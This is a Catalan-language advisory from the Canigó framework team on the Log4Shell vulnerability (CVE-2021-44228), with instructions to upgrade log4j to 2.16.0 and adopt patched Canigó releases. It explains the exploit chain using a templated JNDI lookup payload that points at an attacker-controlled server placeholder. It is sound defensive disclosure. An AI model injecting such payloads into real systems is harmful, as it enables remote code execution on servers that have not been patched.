+++
date        = "2021-12-16"
title       = "Canigó. Vulnerabilitat CVE-2021-44228 (Log4Shell)"
description = "Com resoldre la vulnerabilitat detectada CVE-2021-44228 (Log4Shell)"
#section     = "howtos"
#categories  = ["canigo"]
#key         = "GENER2022"
+++

La vulnerabilitat [CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228) permet executar codi en un
servidor remot, injectant una petició JNDI `${jndi:(ldap|rmi|etc)}` dins de qualsevol variable que es registri al log del servidor.
Aquesta vulnerabilitat **només afecta les versions `2.x` de Log4J i es troba corregida en la versió `2.16.0`**.

Per a explotar la vulnerabilitat, es poden seguir els següents passos:

1. En el servidor que allotja l'aplicació vulnerable, es registra la informació que conté la càrrega útil maliciosa.
Per exemple: `${jndi:ldap://[servidor]/[càrrega útil]}`, on el servidor està controlat per l'atacant i la càrrega útil conté les comandes a executar.

2. La vulnerabilitat s'activa i el servidor vulnerable sol·licita al servidor de l'atacant a través de JNDI el codi maliciós.

3. La resposta del servidor de l'atacant conté la ruta a una classe Java maliciosa. Per exemple: `http://[servidor]/exploit.class`,
que s'injecta en el context de l'aplicació vulnerable.

4. La càrrega útil injectada permet a l'atacant executar codi arbitrari.

<br/>
Informació de referència:

* <https://logging.apache.org/log4j/2.x/security.html#CVE-2021-45046/> \
* <https://nvd.nist.gov/vuln/detail/CVE-2021-44228/> \
* <https://securelist.com/cve-2021-44228-vulnerability-in-apache-log4j-library/105210/> \

## Com solucionar la vulnerabilitat a les aplicacions

---

**Actualització a 16/12/2021**:

Apache ha publicat que les mesures mitigadores han quedat desacreditades donat s'ha descobert
que aquestes només limiten l'exposició mentre deixen oberts alguns vectors d'atac.
La raó per la qual aquestes mesures són insuficients
és que, a més del vector d'atac Thread Context, encara hi ha rutes de codi a Log4j on es poden produir cerques de missatges.
Es conclou, per tant, que la mesura més segura és actualitzar Log4j a una versió segura quedant desacreditades
les següents mesures prèvies comunicades: setting de la propietat log4j2.formatMsgNoLookups o la variable d'entorn
LOG4J_FORMAT_MSG_NO_LOOKUPS a true per a versions >= 2.10, o modificant la configuració de registre per desactivar
les cerques de missatges amb %m{nolookups}, %msg{nolookups} o %message{nolookups per a versions >= 2.7 i <= 2.14.1.

Per a més informació: https://logging.apache.org/log4j/2.x/security.html#CVE-2021-45046

---

Cal substituir la versió de la dependència de la libreria `log4j` en temps de compilació.

* Opció 1) Modificar el fitxer `pom.xml` - **opció recomanada** -, compilar i desplegar l'aplicació:

    > * Sí el JDK és major o igual a `1.8`:
```xml
<properties>
<log4j2.version>2.16.0</log4j2.version>
</properties>
```

    > * Sí el JDK és `1.7`:
```xml
<properties>
<log4j2.version>2.12.2</log4j2.version>
</properties>
```

* Opció 2) Injectar la variable durant la construcció de l'aplicació, compilar i desplegar l'aplicació:
```sh
mvn -Dlog4j2.version=2.16.0 clean package && java -jar ./target/CanigoLog4jShellTest.war
```

## Noves versions de Canigó 3.4 i 3.6

---

**Actualització a 16/12/2021**:

S'està treballant per a generar noves versions de Canigó per a passar a fer ús de la versió 2.16.0 de la llibreria.
Data prevista de publicació: entre el 17/12/2021 i el 20/12/2021.

---

S'han alliberat noves versions del Framework Canigó:

* Versions de Canigó 3.4.7 i 3.6.1 per a resoldre aquesta vulnerabilitat als mòduls de Canigó.
Podeu consultar: [Publicació nova versió 3.4.7 i 3.6.1](/noticies/2021-12-13-CAN-actualitzacio-canigo-3_4_7_3_6_1).

* Versió 1.6.8 de l'archetype de Canigó per a generar projectes amb Canigó 3.4.7.
Podeu consultar: [Actualització archetype 1.6.8](/noticies/2021-12-13-CAN-Actualitzacio_archetype_1_6_8/).

* Versió 1.7.1 de l'archetype de Canigó i la versió 1.8.1 del plugin del eclipse per a generar projectes amb Canigó 3.6.1.
Podeu consultar: [Actualització archetype 1.7.1 i plugin Eclipse 1.8.1](/noticies/2021-12-13-CAN-Actualitzacio_archetype_1_7_1_plugin_eclipse_1_8_1/).

Des de CS Canigó es recomana actualitzar a aquestes noves versions. Per a fer-ho, serà necessari revisar les dependències de l'aplicació
per a utilitzar els mòduls de les versions 3.4.7 i 3.6.1. Podeu consultar les matrius de compatibilitat de les versions:

- [Matrius de Compatibilitats 3.4](/canigo-download-related/matrius-compatibilitats/canigo-34/)

- [Matrius de Compatibilitats 3.6](/canigo-download-related/matrius-compatibilitats/canigo-36/)

Un cop es comprovi que s'utilitzen les últimes versions dels mòduls, caldrà modificar el fitxer `pom.xml` per a assegurar l'ús
de la versió 2.16.0 de log4j:

```xml
<properties>
<log4j2.version>2.16.0</log4j2.version>
</properties>
```

Un cop realitzades les adaptacions descrites, comprovar que només s'utilitza la versió 2.16.0 del log4j a l'aplicació mitjançant:

```
mvn dependency:tree
```

<br/><br/>
Per qualsevol dubte relatiu a aquesta nova versió del Framework Canigó us podeu posar en contacte amb el CS Canigó al servei CAN del JIRA CSTD o enviant-nos un correu electrònic a la bústia del CS Canigó.